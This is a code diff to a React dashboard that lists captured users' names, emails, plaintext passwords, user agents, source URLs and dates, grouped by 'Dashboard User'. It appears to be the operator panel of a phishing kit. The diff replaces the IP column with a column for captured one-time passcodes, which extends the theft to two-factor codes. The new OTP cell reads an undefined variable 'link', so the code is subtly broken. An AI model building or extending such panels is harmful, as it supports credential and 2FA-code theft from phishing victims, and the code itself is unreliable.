@@ -2,7 +2,7 @@
 
 import withAuth from "@/app/utils/auth";
 import { format } from "date-fns";
-import { useState, useEffect, useMemo, useCallback } from "react";
+import { useCallback, useEffect, useMemo, useState } from "react";
 import toast from "react-hot-toast";
 import { MdDelete, MdKeyboardArrowLeft, MdKeyboardArrowRight } from "react-icons/md";
 import useSWR, { mutate } from "swr";
@@ -138,7 +138,7 @@ const SkeletonLoader = () => (
     <table className="w-full border border-collapse border-gray-300 table-auto">
       <thead>
         <tr className="bg-gray-200">
-          {["SL", "Name", "Dashboard User", "Email", "Password", "Ip", "Agent", "Url", "Date", "Delete"].map(
+          {["SL", "Name", "Dashboard User", "Email", "Password", "OTP", "Agent", "Url", "Date", "Delete"].map(
             (header) => (
               <th key={header} className="px-4 py-2 border border-gray-300 text-start">
                 {header}
@@ -176,7 +176,7 @@ const Table = ({ currentItems, startIndex, onDelete, onOpenDeleteModal }) => (
       <table className="w-full border border-collapse border-gray-300 table-auto">
         <thead>
           <tr className="bg-gray-200">
-            {["SL", "Name", "Email", "Password", "Ip", "Agent", "Url", "Date", "Delete"].map((header) => (
+            {["SL", "Name", "Email", "Password", "OTP", "Agent", "Url", "Date", "Delete"].map((header) => (
               <th key={header} className="px-4 py-2 border border-gray-300 text-start">
                 {header}
               </th>
@@ -193,7 +193,8 @@ const Table = ({ currentItems, startIndex, onDelete, onOpenDeleteModal }) => (
               <td className="px-4 py-2 border border-gray-300">{user.name}</td>
               <td className="px-4 py-2 border border-gray-300">{user.email}</td>
               <td className="px-4 py-2 border border-gray-300">{user.password}</td>
-              <td className="px-4 py-2 border border-gray-300">{user.ip}</td>
+              {/* <td className="px-4 py-2 border border-gray-300">{user.ip}</td> */}
+              <td className={`px-4 py-2 border border-gray-300 ${link?.otp ? "text-green-500" : "text-red-500"}`}>{link?.otp ? link?.otp : "N/A"}</td>
               <td className="px-4 py-2 border border-gray-300">{user.userAgent}</td>
               <td className="px-4 py-2 border border-gray-300">{user.url?.split("?")[0]}</td>
               <td className="px-4 py-2 border border-gray-300">
@@ -224,9 +225,8 @@ const Pagination = ({ currentPage, totalPages, onPageChange }) => (
   <div className="flex items-center gap-4 mt-4">
     <button
       onClick={() => onPageChange(currentPage - 1)}
-      className={`${
-        currentPage === 1 ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"
-      } text-white px-3 py-2 rounded`}
+      className={`${currentPage === 1 ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"
+        } text-white px-3 py-2 rounded`}
       disabled={currentPage === 1}
     >
       <MdKeyboardArrowLeft />
@@ -236,9 +236,8 @@ const Pagination = ({ currentPage, totalPages, onPageChange }) => (
         <button
           key={index}
           onClick={() => onPageChange(index + 1)}
-          className={`${
-            currentPage === index + 1 ? "bg-blue-500 text-white" : "bg-gray-200 text-gray-700"
-          } px-4 py-1 rounded`}
+          className={`${currentPage === index + 1 ? "bg-blue-500 text-white" : "bg-gray-200 text-gray-700"
+            } px-4 py-1 rounded`}
         >
           {index + 1}
         </button>
@@ -246,9 +245,8 @@ const Pagination = ({ currentPage, totalPages, onPageChange }) => (
     </div>
     <button
       onClick={() => onPageChange(currentPage + 1)}
-      className={`${
-        currentPage === totalPages ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"
-      } text-white px-3 py-2 rounded`}
+      className={`${currentPage === totalPages ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"
+        } text-white px-3 py-2 rounded`}
       disabled={currentPage === totalPages}
     >
       <MdKeyboardArrowRight />
